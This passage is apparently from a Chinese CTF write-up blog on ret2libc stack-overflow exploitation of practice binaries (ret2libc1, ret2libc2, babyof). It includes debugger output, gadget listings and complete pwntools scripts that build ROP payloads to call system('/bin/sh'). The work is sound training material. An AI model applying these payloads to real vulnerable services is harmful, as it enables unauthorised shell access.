表项，那么这个题目的思路就很明显了，那就是通过栈溢出修改 ret_addr 的地址位 system 函数的 plt 表，之后传入一字长的垃圾数据（这里传入的一字长垃圾数据为的是增加偏移量，因为在 system 函数传参的时候，要绕过 bp 寄存器以及返回地址来取 &quot;/bin/sh&quot; 这一参数，所以，可知，需要绕过两个字长取参数），再然后填入 &quot;/bin/sh&quot; 的地址即可。</p>\n<p>​\t分析到这里，做题的思路大概也清楚了，之后，就是找到需要的信息。</p>\n<p>​\t在 IDA 中分析道，system@plt 的地址为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt:08048460                 jmp     ds:off_804A018</span><br></pre></td></tr></table></figure>\n<p>​\t通过 ROPgadget 找到 &quot;/bin/sh&quot; 的地址为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/mnt/shared# ROPgadget --binary ret2libc1 --string &quot;/bin/sh&quot;</span><br><span class=\"line\">Strings information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure>\n<p>​\t然后通过 gdb 调试来查找栈的偏移长度，在 main 函数上下一个断点，之后等到执行完 gets 函数之后，再传入一定个数的垃圾数据，比如全是 A，之后通过 stack 命令查看栈的情况：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; stack 100───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class=\"line\">00:0000│ esp 0xffffd420 —▸ 0xffffd43c ◂— <span class=\"string\">&#x27;AAAAAAAAAAAAAA&#x27;</span></span><br><span class=\"line\">01:0004│-084 0xffffd424 ◂— 0x0</span><br><span class=\"line\">02:0008│-080 0xffffd428 ◂— 0x1</span><br><span class=\"line\">03:000c│-07c 0xffffd42c ◂— 0x0</span><br><span class=\"line\">04:0010│-078 0xffffd430 —▸ 0xf7fc4570 (__kernel_vsyscall) ◂— push ecx</span><br><span class=\"line\">05:0014│-074 0xffffd434 ◂— 0xffffffff</span><br><span class=\"line\">06:0018│-070 0xffffd438 —▸ 0x8048034 ◂— push es</span><br><span class=\"line\">07:001c│ eax 0xffffd43c ◂— <span class=\"string\">&#x27;AAAAAAAAAAAAAA&#x27;</span></span><br><span class=\"line\">... ↓        2 skipped</span><br><span class=\"line\">0a:0028│-060 0xffffd448 ◂— 0x4141 /* <span class=\"string\">&#x27;AA&#x27;</span> */</span><br><span class=\"line\">0b:002c│-05c 0xffffd44c —▸ 0xffffd5fc ◂— 0x20 /* <span class=\"string\">&#x27; &#x27;</span> */</span><br><span class=\"line\">0c:0030│-058 0xffffd450 ◂— 0x0</span><br><span class=\"line\">0d:0034│-054 0xffffd454 ◂— 0x0</span><br><span class=\"line\">0e:0038│-050 0xffffd458 ◂— 0x1000000</span><br><span class=\"line\">0f:003c│-04c 0xffffd45c ◂— 9 /* <span class=\"string\">&#x27;\\t&#x27;</span> */</span><br><span class=\"line\">10:0040│-048 0xffffd460 —▸ 0xf7fc4570 (__kernel_vsyscall) ◂— push ecx</span><br><span class=\"line\">11:0044│-044 0xffffd464 ◂— 0x0</span><br><span class=\"line\">12:0048│-040 0xffffd468 —▸ 0xf7c184be ◂— <span class=\"string\">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class=\"line\">13:004c│-03c 0xffffd46c —▸ 0xf7e2a054 (_dl_audit_preinit@got.plt) —▸ 0xf7fdde10 (_dl_audit_preinit) ◂— endbr32 </span><br><span class=\"line\">14:0050│-038 0xffffd470 —▸ 0xf7fbe4a0 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class=\"line\">15:0054│-034 0xffffd474 —▸ 0xf7fd6f90 (_dl_fixup+240) ◂— mov edi, eax</span><br><span class=\"line\">16:0058│-030 0xffffd478 —▸ 0xf7c184be ◂— <span class=\"string\">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class=\"line\">17:005c│-02c 0xffffd47c —▸ 0xf7fbe4a0 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class=\"line\">18:0060│-028 0xffffd480 —▸ 0xffffd4c0 —▸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class=\"line\">19:0064│-024 0xffffd484 —▸ 0xf7fbe66c —▸ 0xf7ffdba0 —▸ 0xf7fbe780 —▸ 0xf7ffda40 ◂— ...</span><br><span class=\"line\">1a:0068│-020 0xffffd488 —▸ 0xf7fbeb10 —▸ 0xf7c1acc6 ◂— <span class=\"string\">&#x27;GLIBC_PRIVATE&#x27;</span></span><br><span class=\"line\">1b:006c│-01c 0xffffd48c ◂— 0x1</span><br><span class=\"line\">1c:0070│-018 0xffffd490 ◂— 0x1</span><br><span class=\"line\">1d:0074│-014 0xffffd494 ◂— 0x0</span><br><span class=\"line\">1e:0078│-010 0xffffd498 —▸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class=\"line\">1f:007c│-00c 0xffffd49c —▸ 0xf7d20f9b (__init_misc+43) ◂— add esp, 0x10</span><br><span class=\"line\">20:0080│-008 0xffffd4a0 —▸ 0xffffd6e0 ◂— <span class=\"string\">&#x27;/mnt/shared/ret2libc1&#x27;</span></span><br><span class=\"line\">21:0084│-004 0xffffd4a4 ◂— 0x70 /* <span class=\"string\">&#x27;p&#x27;</span> */</span><br><span class=\"line\">22:0088│ ebp 0xffffd4a8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0</span><br></pre></td></tr></table></figure>\n<p>​\t然后根据垃圾数据填入的位置（这里是 eax 的地址）到 ebp 的位置之间的长度为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0xffffd4a8</span> - <span class=\"number\">0xffffd43c</span></span><br></pre></td></tr></table></figure>\n<p>​\t计算出来的结果为 108，所以，这里需要填入的垃圾数据的长度为 112 字节。</p>\n<p>​\t好了，再之后的脚本编写就很清晰了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">io = process(&#x27;./ret2libc1&#x27;)</span><br><span class=\"line\">bin_sh = 0x08048720</span><br><span class=\"line\">system_plt = 0x08048460</span><br><span class=\"line\">payload = b&#x27;a&#x27;*112 + p32(system_plt) + b&#x27;b&#x27;*4 + p32(bin_sh)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"2情况2\"><a class=\"markdownIt-Anchor\" href=\"#2情况2\">#</a> 2. 情况 2：</h3>\n<h4 id=\"题目案例ctf-wikiret2libc2\"><a class=\"markdownIt-Anchor\" href=\"#题目案例ctf-wikiret2libc2\">#</a> 题目案例：CTF-Wiki–ret2libc2：</h4>\n<p>​\t照理来说，这一道题与上一道题相比，并没有什么太大的区别，差别知识查看字符串的时候，会发现查找不到 &quot;/bin/sh&quot; 这一个字符串，其他的跟上一道题几乎一样。</p>\n<p>​\t那么，首先 checksec 一下，为了后续的方便，这里直接使用 python 交互式来获取一些信息，用的是 ELF () 方法，来获取一部分信息：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/mnt/shared]</span><br><span class=\"line\">└─<span class=\"comment\"># python   </span></span><br><span class=\"line\">Python <span class=\"number\">3.11</span><span class=\"number\">.8</span> (main, Feb  <span class=\"number\">7</span> <span class=\"number\">2024</span>, <span class=\"number\">21</span>:<span class=\"number\">52</span>:08) [GCC <span class=\"number\">13.2</span><span class=\"number\">.0</span>] on linux</span><br><span class=\"line\"><span class=\"type\">Type</span> <span class=\"string\">&quot;help&quot;</span>, <span class=\"string\">&quot;copyright&quot;</span>, <span class=\"string\">&quot;credits&quot;</span> <span class=\"keyword\">or</span> <span class=\"string\">&quot;license&quot;</span> <span class=\"keyword\">for</span> more information.</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>elf = ELF(<span class=\"string\">&#x27;./ret2libc2&#x27;</span>)</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class=\"line\">    Arch:     i386-<span class=\"number\">32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x8048000</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t很明显，这个题是个开启了 NX 的 32 位小端序的程序，那么，拖到 IDA 里面静态分析一下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">100</span>]; <span class=\"comment\">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;What do you think ?&quot;</span>);</span><br><span class=\"line\">  gets(s);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t危险函数很明显，直接就是 gets ()，然后就可以通过这一点来进行栈溢出，检查下其他函数，发现一个 secure 函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">secure</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v0; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> input; <span class=\"comment\">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> secretcode; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v0 = time(<span class=\"number\">0</span>);</span><br><span class=\"line\">  srand(v0);</span><br><span class=\"line\">  secretcode = rand();</span><br><span class=\"line\">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( input == secretcode )</span><br><span class=\"line\">    system(<span class=\"string\">&quot;no_shell_QQ&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t很明显，这道题跟上一道题是差不多的，都在 secure 函数中存在一个 system 函数，但是参数却不正确，那么，之前说过，程序中不存在 &quot;/bin/sh&quot;，所以，这里应该怎么做呢？那就是自己手动写一个进去：通过栈溢出，构造 ROP，来调用两个函数，一个 gets，另一个是 system，因为这俩函数都已经在程序中写了，所以，就提供了这两个函数相关的 plt 表，那么，既然栈的地址随机化了，也就是说不知道栈的基地址是多少，所以，想往栈上写入 &quot;/bin/sh&quot; 的可能性就很低，几乎没有，因此就要考虑其他地方，经过查找，发现：bss 段存在一个变量：buf2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:0804A080                 public buf2</span><br><span class=\"line\">.bss:0804A080 ; char buf2[100]</span><br><span class=\"line\">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class=\"line\">.bss:0804A080 _bss            ends</span><br><span class=\"line\">.bss:0804A080</span><br></pre></td></tr></table></figure>\n<p>​\t那么，就可以很清楚的知道 &quot;/bin/sh&quot; 应该写入的地址在哪里了，那就是 bss 段。</p>\n<p>​\t知道了 buf2 的地址，接下来就是找到 gets 和 system 函数的地址，以及需要填入的垃圾数据的长度，首先通过 python 获取两个函数的 plt 表的地址：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">hex</span>(elf.plt[<span class=\"string\">&quot;system&quot;</span>])</span><br><span class=\"line\"><span class=\"string\">&#x27;0x8048490&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">hex</span>(elf.plt[<span class=\"string\">&quot;gets&quot;</span>])</span><br><span class=\"line\"><span class=\"string\">&#x27;0x8048460&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>​\t之后 gdb 动态调试获取需要的垃圾数据的长度：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; stack 40</span><br><span class=\"line\">00:0000│ esp 0xffffd300 —▸ 0xffffd31c ◂— <span class=\"string\">&#x27;AAAAAAAA&#x27;</span></span><br><span class=\"line\">01:0004│-084 0xffffd304 ◂— 0x0</span><br><span class=\"line\">02:0008│-080 0xffffd308 ◂— 0x1</span><br><span class=\"line\">03:000c│-07c 0xffffd30c ◂— 0x0</span><br><span class=\"line\">04:0010│-078 0xffffd310 —▸ 0xf7ffdb9c —▸ 0xf7fc26f0 —▸ 0xf7ffda30 ◂— 0x0</span><br><span class=\"line\">05:0014│-074 0xffffd314 ◂— 0x1</span><br><span class=\"line\">06:0018│-070 0xffffd318 —▸ 0xf7fc2720 —▸ 0x8048354 ◂— inc edi /* <span class=\"string\">&#x27;GLIBC_2.0&#x27;</span> */</span><br><span class=\"line\">07:001c│ eax 0xffffd31c ◂— <span class=\"string\">&#x27;AAAAAAAA&#x27;</span></span><br><span class=\"line\">08:0020│-068 0xffffd320 ◂— <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">09:0024│-064 0xffffd324 ◂— 0x0</span><br><span class=\"line\">0a:0028│-060 0xffffd328 —▸ 0xf7ffda30 ◂— 0x0</span><br><span class=\"line\">0b:002c│-05c 0xffffd32c ◂— 0x1c</span><br><span class=\"line\">0c:0030│-058 0xffffd330 ◂— 0xffffffff</span><br><span class=\"line\">0d:0034│-054 0xffffd334 —▸ 0xf7fca67c ◂— 0xe</span><br><span class=\"line\">0e:0038│-050 0xffffd338 —▸ 0xf7ffd5e8 (_rtld_global+1512) —▸ 0xf7fca000 ◂— 0x464c457f</span><br><span class=\"line\">0f:003c│-04c 0xffffd33c —▸ 0xffffdfe2 ◂— <span class=\"string\">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class=\"line\">10:0040│-048 0xffffd340 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x32f34</span><br><span class=\"line\">11:0044│-044 0xffffd344 ◂— 0xc /* <span class=\"string\">&#x27;\\x0c&#x27;</span> */</span><br><span class=\"line\">12:0048│-040 0xffffd348 ◂— 0x0</span><br><span class=\"line\">... ↓        3 skipped</span><br><span class=\"line\">16:0058│-030 0xffffd358 ◂— 0x13</span><br><span class=\"line\">17:005c│-02c 0xffffd35c —▸ 0xf7fc2400 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class=\"line\">18:0060│-028 0xffffd360 —▸ 0xf7c216ac ◂— 0x21e04c</span><br><span class=\"line\">19:0064│-024 0xffffd364 —▸ 0xf7fd9d41 (_dl_fixup+225) ◂— mov dword ptr [esp + 0x28], eax                                                                  </span><br><span class=\"line\">1a:0068│-020 0xffffd368 —▸ 0xf7c1c9a2 ◂— <span class=\"string\">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class=\"line\">1b:006c│-01c 0xffffd36c —▸ 0xf7fc2400 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class=\"line\">1c:0070│-018 0xffffd370 —▸ 0xffffd3a0 —▸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c</span><br><span class=\"line\">1d:0074│-014 0xffffd374 —▸ 0xf7fc25d8 —▸ 0xf7ffdb9c —▸ 0xf7fc26f0 —▸ 0xf7ffda30 ◂— ...                                                                    </span><br><span class=\"line\">1e:0078│-010 0xffffd378 —▸ 0xf7fc2ab0 —▸ 0xf7c1f22d ◂— <span class=\"string\">&#x27;GLIBC_PRIVATE&#x27;</span></span><br><span class=\"line\">1f:007c│-00c 0xffffd37c ◂— 0x1</span><br><span class=\"line\">20:0080│-008 0xffffd380 ◂— 0x1</span><br><span class=\"line\">21:0084│-004 0xffffd384 ◂— 0x0</span><br><span class=\"line\">22:0088│ ebp 0xffffd388 ◂— 0x0</span><br><span class=\"line\">23:008c│+004 0xffffd38c —▸ 0xf7c237c5 (__libc_start_call_main+117) ◂— add esp, 0x10                                                                       </span><br><span class=\"line\">24:0090│+008 0xffffd390 ◂— 0x1</span><br><span class=\"line\">25:0094│+00c 0xffffd394 —▸ 0xffffd444 —▸ 0xffffd5c2 ◂— <span class=\"string\">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class=\"line\">26:0098│+010 0xffffd398 —▸ 0xffffd44c —▸ 0xffffd5d8 ◂— <span class=\"string\">&#x27;COLORTERM=truecolor&#x27;</span></span><br><span class=\"line\">27:009c│+014 0xffffd39c —▸ 0xffffd3b0 —▸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c</span><br><span class=\"line\">pwndbg&gt; 0x388 -0x31c</span><br><span class=\"line\">Undefined <span class=\"built_in\">command</span>: <span class=\"string\">&quot;0x388&quot;</span>.  Try <span class=\"string\">&quot;help&quot;</span>.</span><br><span class=\"line\">pwndbg&gt; <span class=\"built_in\">print</span> 0x388 -0x31c</span><br><span class=\"line\"><span class=\"variable\">$1</span> = 108</span><br></pre></td></tr></table></figure>\n<p>​\t基本上需要的信息全部都有了，那么就可以进行代码的编写了，基本上思路按照下图所示：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/aa290048a01543e7bcb197d704071cd2.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t这里的思路是无论后续的程序是否崩溃，都跟我们没关系，所以没有平衡栈，平衡栈的写法如下图：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/cb466c0487d04ffeae39492abda43194.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t因此，最后的 exp 为（没有平衡栈）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">io = process(&#x27;./ret2libc2&#x27;)</span><br><span class=\"line\">gets_plt = 0x8048460</span><br><span class=\"line\">sys_plt = 0x8048490</span><br><span class=\"line\">buf2 = 0x0804A080</span><br><span class=\"line\">payload = b&#x27;A&#x27;*112 + p32(gets_plt) + p32(sys_plt) + p32(buf2) + p32(buf2)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"3情况3\"><a class=\"markdownIt-Anchor\" href=\"#3情况3\">#</a> 3. 情况 3：</h3>\n<h4 id=\"题目案例2021-鹤城杯babyof\"><a class=\"markdownIt-Anchor\" href=\"#题目案例2021-鹤城杯babyof\">#</a> 题目案例：[2021 鹤城杯] babyof：</h4>\n<p>​\t在做学习 CTF-Wiki–ret2libc3 的时候可我发现了一系列的问题，就比如说 LibcSearcher 查找本地运行的程序的 libc 版本总是出现查找的 10 个版本全部不匹配之类的情况，很让人头疼，并且也没有找到有效的解决方法，有点凭运气，<strong>这个问题先记录在这里</strong>，等到以后有机会了再重新编写这个问题。</p>\n<p>​\t又因为之前都是做的关于 32 位程序的 ret2libc，所以这里又因为刚好碰到了本地运行的程序的 libc 版本找不到的情况，因此这里就换一个 64 的程序来做。</p>\n<p>​\t首先，讲一下前置的知识，关于 64 位程序的函数的传参方式还有其他的一些前置内容。</p>\n<p>​\t64 位程序与 32 位程序的函数传参方式是后一定的区别的，32 位程序的传参只用到了栈，而 64 位的程序的传参前六个参数分别用到了 rdi，rsi，rdx，rcx，r8，r9 这六个寄存器，之后才会用到栈。</p>\n<p>​\t另外，对于 libc 的载入内存，动态链接库载入到内存中的起始地址是部分随机的，不过因为内存分页的概念，会发现每一次运行程序的时候，libc 的某一个函数的地址的后三位是不变的，也正因为 libc 载入内存的起始地址是随机在分页的起始地址，所以会发现每一次运行程序泄露到的函数地址的后三位是相同的，因此，LibcSearcher 模块以及其他的相对应的网站工具才能获得正确的 libc 的版本。</p>\n<p>​\t好的，前置的知识差不多就这些了，之后遇到了再说，首先打开题目，第一时间看看保护：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/mnt/shared<span class=\"comment\"># checksec babyof</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/mnt/shared/babyof&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>​\t可见，是 64 为小端序，开启了 NX 保护，之后静态调试看看，首先是 main，左边能找到，发现 main 里面调用了个函数，是以地址的形式，跟进这个函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_400632</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">64</span>]; <span class=\"comment\">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Do you know how to do buffer overflow?&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;I hope you win&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t很不错，很明显，这个就是漏洞函数，那么，先用 cyclic 算一下偏移量，得到的是 72：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/b60c8d0628ed44e2bda0cff18649dcf3.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t之后，还需要 ret 和 pop rdi;ret 的 gadgets，所以用 ROPgadget 来查：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/mnt/shared<span class=\"comment\"># ROPgadget --binary babyof --only &quot;pop|ret&quot;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000000000040073c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040073e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400740 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400742 : pop r15 ; ret</span><br><span class=\"line\">0x000000000040073b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040073f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400619 : pop rbp ; ret</span><br><span class=\"line\">0x0000000000400743 : pop rdi ; ret</span><br><span class=\"line\">0x0000000000400741 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040073d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400506 : ret</span><br><span class=\"line\">0x0000000000400870 : ret 0xfffd</span><br><span class=\"line\"></span><br><span 